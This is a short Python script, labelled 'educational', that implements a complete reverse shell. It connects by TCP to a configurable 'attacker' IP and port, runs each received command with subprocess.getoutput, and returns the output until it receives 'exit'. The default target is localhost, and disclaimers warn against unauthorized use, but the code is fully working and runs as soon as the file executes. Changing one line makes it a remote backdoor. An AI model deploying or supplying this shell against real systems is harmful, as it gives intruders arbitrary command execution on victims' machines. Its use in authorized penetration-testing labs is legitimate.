# ==========================================
# EDUCATIONAL REVERSE SHELL SCRIPT
# ==========================================
# This script demonstrates how a reverse shell works.
# It is for educational and cybersecurity learning purposes ONLY.
# DO NOT use this for unauthorized access, as it is illegal and unethical.
# ==========================================

import socket
import subprocess

def reverse_shell(server_ip, server_port):
    """
    Establishes a reverse shell connection to a remote server.
    
    Parameters:
    - server_ip (str): The attacker's IP address (for testing purposes).
    - server_port (int): The attacker's listening port.

    This function will connect to the attacker's machine, receive commands,
    execute them, and send back the results.
    """
    try:
        # Create a TCP socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server_ip, server_port))  # Connect to the attacker's machine

        while True:
            command = s.recv(1024).decode('utf-8')  # Receive command
            if command.lower() == 'exit':  # Terminate if 'exit' is received
                break

            output = subprocess.getoutput(command)  # Execute the command
            s.send(output.encode('utf-8'))  # Send output back

        s.close()  # Close the connection
    except Exception as e:
        print(f"[ERROR] Connection failed: {e}")

# ==========================================
# NOTE: This script should only be used in a controlled environment
# such as a penetration testing lab, with full authorization.
# Unauthorized use can result in serious legal consequences.
# ==========================================

# Replace with a controlled testing server IP & port
server_ip = "127.0.0.1"  # Localhost for safe testing
server_port = 8080  # Port for testing

# Run the reverse shell (FOR EDUCATIONAL PURPOSES ONLY)
reverse_shell(server_ip, server_port)
